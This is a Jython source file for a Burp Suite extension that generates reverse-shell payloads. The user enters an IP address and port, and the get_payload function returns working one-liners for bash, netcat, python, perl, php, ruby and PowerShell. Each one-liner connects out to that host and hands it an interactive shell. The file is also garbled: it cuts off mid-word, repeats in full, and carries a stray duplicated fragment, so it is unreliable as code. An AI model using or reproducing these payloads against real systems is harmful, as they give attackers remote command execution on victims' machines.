# coding: utf-8

from burp import IBurpExtender, ITab
from javax.swing import JPanel, JComboBox, JLabel, JTextField, JButton, JTextArea, JScrollPane
from java.awt import GridLayout

class BurpExtender(IBurpExtender, ITab):

    def registerExtenderCallbacks(self, callbacks):
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()
        self.callbacks.setExtensionName("Reverse Shell Generator")

        self.shell_types = ["bash", "netcat", "netcat_alternative", "python", "perl", "php", "ruby", "powershell"]

        # GUI components
        self.panel = JPanel(GridLayout(0,2))
        
        self.shellLabel = JLabel("Shell Type:")
        self.shellCombo = JComboBox(self.shell_types)
        
        self.ipLabel = JLabel("IP Address:")
        self.ipField = JTextField(15)
        
        self.portLabel = JLabel("Port:")
        self.portField = JTextField(5)

        self.generateButton = JButton("Generate", actionPerformed=self.generate_payload)
        self.payloadArea = JTextA# coding: utf-8

from burp import IBurpExtender, ITab
from javax.swing import JPanel, JComboBox, JLabel, JTextField, JButton, JTextArea, JScrollPane
from java.awt import GridLayout

class BurpExtender(IBurpExtender, ITab):

    def registerExtenderCallbacks(self, callbacks):
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()
        self.callbacks.setExtensionName("Reverse Shell Generator")

        self.shell_types = ["bash", "netcat", "netcat_alternative", "python", "perl", "php", "ruby", "powershell"]

        # GUI components
        self.panel = JPanel(GridLayout(0,2))
        
        self.shellLabel = JLabel("Shell Type:")
        self.shellCombo = JComboBox(self.shell_types)
        
        self.ipLabel = JLabel("IP Address:")
        self.ipField = JTextField(15)
        
        self.portLabel = JLabel("Port:")
        self.portField = JTextField(5)

        self.generateButton = JButton("Generate", actionPerformed=self.generate_payload)
        self.payloadArea = JTextArea(10, 30)
        self.payloadScroll = JScrollPane(self.payloadArea)
        
        # Add components to main panel
        self.panel.add(self.shellLabel)
        self.panel.add(self.shellCombo)
        self.panel.add(self.ipLabel)
        self.panel.add(self.ipField)
        self.panel.add(self.portLabel)
        self.panel.add(self.portField)
        self.panel.add(self.generateButton)
        self.panel.add(self.payloadScroll)
        
        # Add the custom tab to Burp's UI
        callbacks.addSuiteTab(self)
        return

    def getTabCaption(self):
        return "Reverse Shell Gen"

    def getUiComponent(self):
        return self.panel

    def generate_payload(self, event):
        shell_type = self.shellCombo.getSelectedItem()
        ip = self.ipField.getText()
        port = self.portField.getText()
        payload = self.get_payload(shell_type, ip, port)
        self.payloadArea.setText(payload)
    
    def get_payload(self, shell_type, ip, port):
        shells = {
            "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "netcat": "nc -e /bin/sh {ip} {port}",
            "netcat_alternative": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "php": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "powershell": "$socket = New-Object System.Net.Sockets.TcpClient('{ip}', {port}); if($socket -eq $null) {{exit 1}}; $stream = $socket.GetStream(); [byte[]]$bytes = 0..65535 | ForEach-Object {{0}}; $writer = New-Object System.IO.StreamWriter($stream); $buffer = New-Object System.Byte[] 1024; $encoding = New-Object System.Text.AsciiEncoding; do {{ $read = $stream.Read($buffer, 0, $buffer.Length); $data = ($encoding.GetString($buffer, 0, $read)).Trim('\0'); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }} while($read -ne 0); $socket.Close()"

        }

        if shell_type in shells:
            return shells[shell_type].format(ip=ip, port=port)
        else:
            return "Invalid shell type!"

# Burp будет автоматически искать класс, который реализует IBurpExtender, 
# и вызывать его метод registerExtenderCallbacks().
rea(10, 30)
        self.payloadScroll = JScrollPane(self.payloadArea)
        
        # Add components to main panel
        self.panel.add(self.shellLabel)
        self.panel.add(self.shellCombo)
        self.panel.add(self.ipLabel)
        self.panel.add(self.ipField)
        self.panel.add(self.portLabel)
        self.panel.add(self.portField)
        self.panel.add(self.generateButton)
        self.panel.add(self.payloadScroll)
        
        # Add the custom tab to Burp's UI
        callbacks.addSuiteTab(self)
        return

    def getTabCaption(self):
        return "Reverse Shell Gen"

    def getUiComponent(self):
        return self.panel

    def generate_payload(self, event):
        shell_type = self.shellCombo.getSelectedItem()
        ip = self.ipField.getText()
        port = self.portField.getText()
        payload = self.get_payload(shell_type, ip, port)
        self.payloadArea.setText(payload)
    
    def get_payload(self, shell_type, ip, port):
        shells = {
            "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "netcat": "nc -e /bin/sh {ip} {port}",
            "netcat_alternative": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "php": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "powershell": "$socket = New-Object System.Net.Sockets.TcpClient('{ip}', {port}); if($socket -eq $null) {{exit 1}}; $stream = $socket.GetStream(); [byte[]]$bytes = 0..65535 | ForEach-Object {{0}}; $writer = New-Object System.IO.StreamWriter($stream); $buffer = New-Object System.Byte[] 1024; $encoding = New-Object System.Text.AsciiEncoding; do {{ $read = $stream.Read($buffer, 0, $buffer.Length); $data = ($encoding.GetString($buffer, 0, $read)).Trim('\0'); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }} while($read -ne 0); $socket.Close()"

        }

        if shell_type in shells:
            return shells[shell_type].format(ip=ip, port=port)
        else:
            return "Invalid shell type!"

# Burp будет автоматически искать класс, который реализует IBurpExtender, 
# и вызывать его метод registerExtenderCallbacks().
